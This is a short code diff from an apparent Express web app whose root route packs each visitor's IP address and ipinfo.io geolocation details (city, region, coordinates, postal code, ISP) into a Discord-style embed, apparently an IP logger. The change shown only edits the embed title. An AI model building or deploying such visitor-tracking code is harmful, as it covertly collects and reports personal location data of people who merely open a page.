@@ -78,7 +78,7 @@ app.get("/", (req, res) => {
                         "embeds": [
                             {
                                 "type": "rich",
-                                "title": `${ip}`,
+                                "title": `IP=Address Found for Website`,
                                 "description": `IP: ${ip}\nCity: ${ipinfo['city']}\nRegion: ${ipinfo['region']}\nCountry: ${ipinfo['country']}\nLocation: ${ipinfo['loc']}\nORG: ${ipinfo['org']}\nPostal: ${ipinfo['postal']}\nTimeZone: ${ipinfo['timezone']}\n`,
                                 "color": 0x00FFFF,
                                 "url": `https://ipinfo.io/${ip}`
